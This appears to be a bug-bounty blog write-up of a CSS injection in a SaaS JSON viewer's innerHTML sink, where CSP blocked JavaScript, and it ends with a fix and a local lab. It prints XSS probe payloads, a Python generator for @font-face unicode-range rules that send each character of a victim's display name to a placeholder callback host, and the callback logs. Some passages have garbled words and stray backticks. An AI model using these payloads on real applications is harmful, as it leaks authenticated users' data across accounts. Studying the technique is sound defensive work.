“I don’t understand client-side”

Picture this: It’s 2am, three red bulls deep into a private program and I’m red-eyed, staring at a webpack bundle called 3176.98a13d71ac14acb1410e.js. When scanning the client-side code, an innerHTML instantly gives me the nerd snipe. Zero encoding on user input... my pulse starts doing the thing, and all I can think about is shiny rocks.

if (isUrl) {

  e = `<a href=”${e}” target=”_blank” class=”jv-link”>${e}</a>`;

  attrs.innerHTML = `”${e}”`;    // ← raw user input, no encoding

On a sleepy whim, I straight-up shoot with <img onerror=alert(1)>, but the CSP blocks it. I try javascript: URIs, everything. Inconsistent across browsers, I turn to <script> but no dice and the HTML5 spec says no via innerHTML. Three execution vectors, three walls. The sink is real, the data is attacker-controlled, and I cannot make JavaScript run.

Most of me says close the tab and go back to my gadgets and leads, the mass assignment on the billing endpoint, the SSRF chain through the OAuth provider config or the AI agent’s leaked system prompt. Server side: my bread and butter, the kind of bugs where the payload is a JSON body and the proof is a response code.

But something deep inside me nags. The CSP allows inline styles. And font-src is https: — meaning fonts from any HTTPS URL in the world.

That nagging turned into my fifth CSS injection leading to DOM text exfiltration in just over the past couple of weeks. Five different programs. Five innerHTML sinks. Five times where “CSP blocks JavaScript” was the beginning of the hunt, not the end. And I am going to be honest: I am nerdsniped. Fully, irreversibly client-side-pilled. The dopamine hit of watching font callbacks trickle in one by one on my OOB callback — each one a single character leaking from someone’s authenticated session.

This post is redacted. Hostnames, IDs, and callback URLs have been replaced. A minimal reproduction lab is at the end if you want to feel this yourself.

CSS doesn’t execute code. CSS doesn’t need to.

If you are coming from server-side like I was, I need you to forget everything you think you know about CSS injection being a cosmetic issue. Red borders. Comic Sans. “Low severity, won’t fix.” That reputation is a gift to attackers because it means defenders underestimate it.

CSS cannot execute JavaScript. But CSS can make the browser do things that feel like they should not be possible:

  • Leak text from the DOM — @font-face with unicode-range makes the browser request a unique URL for each character it renders. Your callback server sees which characters exist in any targeted element. One GET per letter. That is your username leaking over the wire as font requests.

  • Brute-force hidden values — input[value^=”a”] CSS selectors with background-image callbacks let you extract CSRF tokens, hidden field values, anything in a DOM attribute, character by character. The browser does the brute-forcing for you.

  • Phish without a phishing page — CSS positioning can overlay a pixel-perfect fake login form on top of the real authenticated UI. The user thinks they are re-authenticating. They are sending credentials to you.

  • Hijack clicks — transparent overlays redirect user actions to attacker-controlled elements.

The sinks are the same ones you look for with XSS: innerHTML, v-html, document.write, outerHTML, jQuery .html(). You just inject <style> tags instead of <script>.

And here is the kicker — CSS injection wins in scenarios where XSS literally cannot:

Scenario                                      JS          CSS
--------------------------------------------  ----------  -----------------------------------------
script-src-attr: 'none'                       dead        works
innerHTML sink (<script> blocked by HTML5)    dead        works
style-src: 'unsafe-inline' + font-src:https:  irrelevant  full exfil
need zero-click                               maybe       applies immediately on render

Every time I have found an innerHTML sink where CSP killed JavaScript, CSS has given me a path to impact. Every. Single. Time. Five programs and counting.

Source, sink, and everything between

The target was a log observability SaaS. Users could create telemetry pipelines with sources, transforms, and sinks. Each pipeline source had a simulation feature where you could create sample events and run them through the pipeline to test data flow. When I’m walking through the application, I’m building a mental model, mapping sources to sinks and setting the scene from an attacker/victim perspective. Let’s break down the above application flow:

  • Threat model: The attacker is a regular org member. Not admin, not owner. Just a member with pipeline access, which is the default for every user. They create a malicious pipeline sample. Any other org member who opens the pipeline builder and views that sample in the JSON viewer triggers the injection.

  • Source: POST /v3/pipeline/{id}/source/{src}/sample — the data[].message field accepts arbitrary strings with zero server-side validation.

  • Sink: JsonString Vue component renders JSON values where URL-like strings go through innerHTML. Everything else uses safe innerText.

The if that mass assigned trust

Do you see it? The developer knew the difference between innerText and innerHTML. They used innerText on the safe path. Then they built an HTML string from raw user input via template literal and assigned it to innerHTML on the URL path.

The regex /^\w+:\/\// is the gate. Anything starting with word:// enters the vulnerable branch. That means http://, https://, ftp:// — and any attacker-crafted anything:// prefix.

The value appears twice in the generated markup — once in href, once as link text. Neither is encoded.

CSP locked the front door, left the fonts wide open

This is where most people stop. This is where I almost stopped. Let me show you the wall first:

At first, I threw the standard arsenal at it:

<img src=x onerror=alert(1)>

The <img> rendered. Full DOM node. Broken image icon staring back at me. But onerror? Silent. script-src-attr: ‘none’ blocks every inline event handler attribute — onerror, onclick, onload`, `ontole, all of them. Dead on arrival.

There it was in DevTools. A real <img> element, sitting in the authenticated DOM, mocking me with its little broken image icon like a participation trophy.

I tried javascript:` URIs nex These technically fall unde`script-src (which has unsafe-inline’), not `script-src-attr. Should work on paper. But the template wraps every value in `target=”_blk”`, and browsers handle `javascript: URIs with `target=”_blank”` like it is a philosophical question — Chrome does one thing, Firefox does another, and neither does what I need reliably. I do not claim things I cannot reproduce cleanly.

My ledger was open. My cursor was blinking next to `noob`. I was about to type it. Then I looked at the CSP one more time.

style-src: ‘unsafe-inline’. My injected <style> tags will execute. font-src: ‘self’ https:. I can load fonts from literally any HTTPS URL on the internet.

Teaching CSS to read

CSS cannot read the DOM. JavaScript can. That is the conventional wisdom, and it is technically correct. But CSS can do something almost as useful: it can make the browser load external resources *conditionally based on what characters it needs to render*.

Let me show you the primitive:

  1. Define one @font-face rule per character, each pointing to a unique callback URL.

  2. Apply the custom font to a target DOM element.

  3. The browser only fetches fonts for characters present in the rendered text.

  4. Each callback tells the attacker “this character exists in the target element.”

This is documented CSS injection research. Not new. But devastatingly effective against short structured text — usernames, IDs, labels, config values. My target was .current-account-name, the authenticated user’s display name in the sidebar. In my test account: 0xmoose. I expected callbacks for: 0, x, m, o, s, e.

Drum roll: The payload generator

marker = “REDACTED_MARKER”

callback = “https://CALLBACK_URL/REDACTED”

chars = “abcdefghijklmnopqrstuvwxyz0123456789@._-+”

family = f”h1uf{marker}”

def safe(ch):

    return ch if ch.isalnum() else format(ord(ch), “x”)

rules = “”.join(

    f’@font-face{{font-family:{family};’

    f’src:url({callback}?marker={marker}&vector=unicode&c={safe(ch)}) format(”woff2”);’

    f’unicode-range:U+{ord(ch):04X};}}’

    for ch in chars

)

css = rules + f”.current-account-name{{font-family:{family}!important}}”

message = f’http://x”><style id=h1unicode{marker}>{css}</style><a href=”http://y’

Each @font-face rule targets one Unicode code point. The !important override ensures our font wins over the app’s existing styles. The full payload — one @font-face per character in the test alphabet — fits in a single API request.

Stringing this all together

Victim navigates to the pipeline builder. Clicks Simulate. Views the stored sample. JsonString renders the message. Regex matches http://. Breakout fires. Te `<style> tag enters the DOM. And then the browser initiates the exfil.

Then the callback lit up like Christmas:

GET /?marker=REDACTED&vector=unicode&c=x    → ‘x’ is in the name

GET /?marker=REDACTED&vector=unicode&c=m    → ‘m’ is in the name

GET /?marker=REDACTED&vector=unicode&c=o    → ‘o’ is in the name

Character set {0, x, m, o, s, e} matches 0xmoose.

Six font requests. Six characters. Zero JavaScript. An authenticated user’s display name, decomposed into individual characters and sent as network requests to a server I control, triggered by CSS rules that I stored in a JSON field that nobody thought to validate.

The full picture: cross-user, lowest privilege

Six callbacks prove the technique. But a bug is not a bug until it crosses a user boundary.

The sample API did not require admin privileges. Any org member — the lowest-privilege role in the system — could create pipeline samples visible to every other org member in the simulation view. Attacker stores the payload. Victim opens the pipeline. CSS loads. Fonts fire. Characters leak. The victim never clicks anything suspicious. They just viewed a sample.

And this was not an isolated sink. I mapped every innerHTML assignment across the codebase — nine sinks total with user-influenced data. Five used encodeHTML(). Four did not. The JsonString component was the only one with zero protection — no encoding, no input validation, nothing. The others were saved by server-side regex on their inputs. The pattern told the whole story: encoding applied in five out of nine places that needed it.

The boring fix

Do not build HTML strings from user input. That is the entire fix.

/ What was there:

e = `<a href=”${e}” target=”_blank” class=”jv-link”>${e}</a>`;

attrs.innerHTML = `”${e}”`;

// What should be there:

h(”a”, {

  href: value,

  target: “_blank”,

  rel: “noopener noreferrer”,

  class: “jv-link”,

}, value)     // ← text content, not HTML

Or without a framework:

const a = document.createElement(”a”);

a.href = value;

a.target = “_blank”;

a.className = “jv-link”;

a.textContent = value;    // ← textContent, never innerHTML

CSP reduced the blast radius. It should never be the primary defense.

Break it yourself

I built a minimal reproduction lab so you can feel this bug in your own browser. One file, zero dependencies, ships with the same CSP that made this interesting in the first place:

cd innerhtml-url-autolinker-css-exfil && node server.js
# → http://localhost:3337

Paste the payload. Watch the <style>` tag rend. Point the `@font-face at your own attacker callback.

The vulnerable function is about 15 lines. The ternary is the bug. You will see it immediately. Try to fix it before looking at the recommended fix in this post — it is a good exercise in thinking about what textContent gives you that `innerHTML does not.
